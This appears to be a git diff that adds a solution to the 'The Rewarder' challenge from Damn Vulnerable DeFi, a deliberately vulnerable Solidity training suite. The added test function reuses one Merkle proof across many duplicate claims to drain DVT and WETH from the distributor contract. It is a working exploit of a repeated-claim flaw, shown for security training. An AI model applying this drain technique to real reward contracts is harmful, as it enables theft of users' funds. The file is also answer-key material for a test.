@@ -8,6 +8,7 @@ import {WETH} from "solmate/tokens/WETH.sol";
 import {TheRewarderDistributor, IERC20, Distribution, Claim} from "../../src/the-rewarder/TheRewarderDistributor.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 
+
 contract TheRewarderChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -147,10 +148,85 @@ contract TheRewarderChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_theRewarder() public checkSolvedByPlayer {
-        
+      function test_theRewarder() public checkSolvedByPlayer {
+    uint256 wethAmount = 1171088749244340;
+    uint256 dvtAmount = 11524763827831882;
+
+    IERC20[] memory tokens = new IERC20[](2);
+    tokens[0] = IERC20(address(dvt));
+    tokens[1] = IERC20(address(weth));
+
+    // -------- DVT --------
+    {
+        bytes32 leaf = keccak256(abi.encodePacked(player, dvtAmount));
+        bytes32[] memory leaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+
+        uint256 index;
+        for (uint256 i = 0; i < leaves.length; i++) {
+            if (leaves[i] == leaf) {
+                index = i;
+                break;
+            }
+        }
+        require(leaves[index] == leaf);
+
+        bytes32[] memory proof = merkle.getProof(leaves, index);
+
+        uint256 repeats = dvt.balanceOf(address(distributor)) / dvtAmount;
+
+        Claim[] memory claims = new Claim[](repeats);
+        for (uint256 i = 0; i < repeats; i++) {
+            claims[i] = Claim({
+                batchNumber: 0,
+                amount: dvtAmount,
+                tokenIndex: 0,
+                proof: proof
+            });
+        }
+
+        distributor.claimRewards(claims, tokens);
+
+        for (uint256 i = 0; i < repeats; i++) {
+            dvt.transfer(recovery, dvtAmount);
+        }
     }
 
+    // -------- WETH --------
+    {
+        bytes32 leaf = keccak256(abi.encodePacked(player, wethAmount));
+        bytes32[] memory leaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+
+        uint256 index;
+        for (uint256 i = 0; i < leaves.length; i++) {
+            if (leaves[i] == leaf) {
+                index = i;
+                break;
+            }
+        }
+        require(leaves[index] == leaf);
+
+        bytes32[] memory proof = merkle.getProof(leaves, index);
+
+        uint256 repeats = weth.balanceOf(address(distributor)) / wethAmount;
+
+        Claim[] memory claims = new Claim[](repeats);
+        for (uint256 i = 0; i < repeats; i++) {
+            claims[i] = Claim({
+                batchNumber: 0,
+                amount: wethAmount,
+                tokenIndex: 1,
+                proof: proof
+            });
+        }
+
+        distributor.claimRewards(claims, tokens);
+
+        for (uint256 i = 0; i < repeats; i++) {
+            weth.transfer(recovery, wethAmount);
+        }
+    }
+}
+ 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
      */
